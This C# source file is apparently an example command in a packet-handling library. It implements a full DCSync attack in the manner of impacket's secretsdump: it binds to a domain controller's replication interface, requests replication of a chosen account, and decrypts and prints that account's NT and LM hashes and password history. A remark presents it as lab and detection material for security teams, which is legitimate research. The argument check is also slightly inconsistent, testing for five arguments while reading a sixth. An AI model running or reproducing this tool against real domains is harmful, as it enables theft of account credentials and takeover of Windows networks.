using System.Buffers.Binary;
using DotNetPacket.Core;
using DotNetPacket.Protocols.Dcerpc;

namespace DotNetPacket.Examples;

/// <summary>
/// secretsdump (DCSync): extracts an account's secrets by replicating it from a DC over DRSUAPI,
/// the way impacket's <c>examples/secretsdump.py</c> does with the <c>NTDSHashes</c> DRSUAPI path.
/// It drives IDL_DRSBind → IDL_DRSDomainControllerInfo → IDL_DRSCrackNames → IDL_DRSGetNCChanges
/// (EXOP_REPL_OBJ) over the sealed ncacn_ip_tcp transport, then decrypts the replicated secrets.
/// </summary>
/// <remarks>
/// Lab-first and detection-focused. DCSync's wire tell — a DRSGetNCChanges carrying
/// ulExtendedOp = EXOP_REPL_OBJ from a source IP that is not a domain controller — is a classic
/// behavioral detection; this command exists so the SOC can generate and study that traffic.
/// </remarks>
internal static class DcSync
{
    public static int Run(string[] args)
    {
        if (args.Length < 5)
        {
            Console.Error.WriteLine(
                "usage: dcsync <dc-host> <user> <password> <domain-fqdn> <target-user> [netbios-domain] [epm-port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domainFqdn = args[4];
        string targetUser = args[5];
        string netbios = args.Length >= 7 ? args[6] : domainFqdn.Split('.')[0].ToUpperInvariant();
        int epmPort = args.Length >= 8 ? int.Parse(args[7]) : 135;

        // 1) Resolve drsuapi's dynamic TCP port via the endpoint mapper.
        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
        if (!mapper.Bind(DcerpcInterface.Epm).Accepted)
        {
            Console.Error.WriteLine("Bind to endpoint mapper rejected.");
            return 1;
        }

        EpmMapResult? mapped = Epm.MapTcp(mapper, DcerpcInterface.Drsuapi);
        mapper.Close();
        if (mapped is null)
        {
            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
            return 1;
        }

        Console.WriteLine($"drsuapi endpoint on {host}: {mapped}  (resolved via ept_map)");

        // 2) Connect and bind drsuapi with NTLMSSP packet privacy (sign+seal).
        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, mapped.Port);
        DcerpcBindAck ack = pipe.BindAuthenticated(
            DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Authenticated drsuapi bind rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        byte[]? sessionKey = pipe.SessionKey;
        if (sessionKey is null)
        {
            Console.Error.WriteLine("No DCERPC session key after bind (cannot decrypt secrets).");
            return 1;
        }

        // 3) IDL_DRSBind — establish the replication handle; honour the DC's dwReplEpoch.
        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(
            pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
        if (bind.ReplEpoch != 0)
        {
            bind = Drsuapi.ParseBindResponse(
                pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
        }

        Console.WriteLine($"DRSBind ok — DRS_HANDLE {Convert.ToHexString(bind.Handle)[..16]}… replEpoch {bind.ReplEpoch}");

        // 4) IDL_DRSDomainControllerInfo (level 2) — the DC's own NtdsDsaObjectGuid for the req header.
        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo,
                Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
        Console.WriteLine($"DRSDomainControllerInfo ok — NtdsDsaObjectGuid {ntdsDsaGuid}");

        // 5) IDL_DRSCrackNames — resolve the NT4 account name to its objectGUID.
        string nt4 = $"{netbios}\\{targetUser}";
        Drsuapi.CrackedName cracked = Drsuapi.ParseCrackNamesResponse(
            pipe.Call(Drsuapi.OpnumDrsCrackNames,
                Drsuapi.BuildCrackNamesStub(bind.Handle, Drsuapi.DsNt4AccountName, Drsuapi.DsUniqueIdName, nt4)));
        if (cracked.Status != 0 || string.IsNullOrEmpty(cracked.Name))
        {
            Console.Error.WriteLine($"DRSCrackNames failed for {nt4} (status {cracked.Status}).");
            return 1;
        }

        Guid targetGuid = Guid.Parse(cracked.Name.Trim('{', '}'));
        Console.WriteLine($"DRSCrackNames ok — {nt4} -> {targetGuid}");

        // 6) IDL_DRSGetNCChanges (EXOP_REPL_OBJ) — replicate the single object.
        Console.WriteLine("DRSGetNCChanges (EXOP_REPL_OBJ) — the DCSync replication request…");
        byte[] getNcStub = Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid);
        DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
            pipe.Call(Drsuapi.OpnumDrsGetNcChanges, getNcStub));

        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
        pipe.Close();

        // 7) Decrypt and print the secrets in secretsdump format: domain\user:rid:lm:nt:::
        PrintSecrets(obj, sessionKey, targetUser);
        return 0;
    }

    private static void PrintSecrets(DrsReplicaObject obj, byte[] sessionKey, string fallbackName)
    {
        byte[]? sidValue = obj.FirstValue(Drsuapi.AttObjectSid);
        uint rid = sidValue is not null ? RidFromSid(sidValue) : 0;

        string sam = fallbackName;
        byte[]? samValue = obj.FirstValue(Drsuapi.AttSamAccountName);
        if (samValue is not null)
        {
            sam = System.Text.Encoding.Unicode.GetString(samValue);
        }

        string nt = "31d6cfe0d16ae931b73c59d7e0c089c0"; // empty-password NT hash default
        byte[]? encNt = obj.FirstValue(Drsuapi.AttUnicodePwd);
        if (encNt is not null)
        {
            byte[] layer1 = DrsCrypto.DecryptAttributeValue(sessionKey, encNt);
            nt = Convert.ToHexString(DrsCrypto.RemoveDesLayer(layer1, rid)).ToLowerInvariant();
        }

        string lm = "aad3b435b51404eeaad3b435b51404ee"; // empty-password LM hash default
        byte[]? encLm = obj.FirstValue(Drsuapi.AttDbcsPwd);
        if (encLm is not null)
        {
            byte[] layer1 = DrsCrypto.DecryptAttributeValue(sessionKey, encLm);
            lm = Convert.ToHexString(DrsCrypto.RemoveDesLayer(layer1, rid)).ToLowerInvariant();
        }

        Console.WriteLine();
        Console.WriteLine($"{sam}:{rid}:{lm}:{nt}:::");

        PrintHistory(obj, sessionKey, rid, sam, "NT", Drsuapi.AttNtPwdHistory);
    }

    private static void PrintHistory(
        DrsReplicaObject obj, byte[] sessionKey, uint rid, string sam, string label, uint attr)
    {
        byte[]? enc = obj.FirstValue(attr);
        if (enc is null)
        {
            return;
        }

        byte[] decrypted = DrsCrypto.DecryptAttributeValue(sessionKey, enc);
        int count = decrypted.Length / 16;
        if (count <= 1)
        {
            return; // only the current hash; nothing historical to show
        }

        Console.WriteLine($"  {label} password history ({count} entries):");
        for (int i = 0; i < count; i++)
        {
            byte[] h = DrsCrypto.RemoveDesLayer(decrypted[(i * 16)..((i + 1) * 16)], rid);
            Console.WriteLine($"    {sam}_history{i}:{rid}:{Convert.ToHexString(h).ToLowerInvariant()}");
        }
    }

    private static uint RidFromSid(byte[] sid)
    {
        // SID: revision(1) + subAuthCount(1) + idAuth(6) + subAuths(4*count). RID = last sub-authority.
        if (sid.Length < 8)
        {
            return 0;
        }

        return BinaryPrimitives.ReadUInt32LittleEndian(sid.AsSpan(sid.Length - 4));
    }

    private static byte[] BuildUnbindStub(byte[] handle)
    {
        var ndr = new NdrWriter();
        ndr.WriteContextHandle(handle);
        return ndr.ToArray();
    }
}
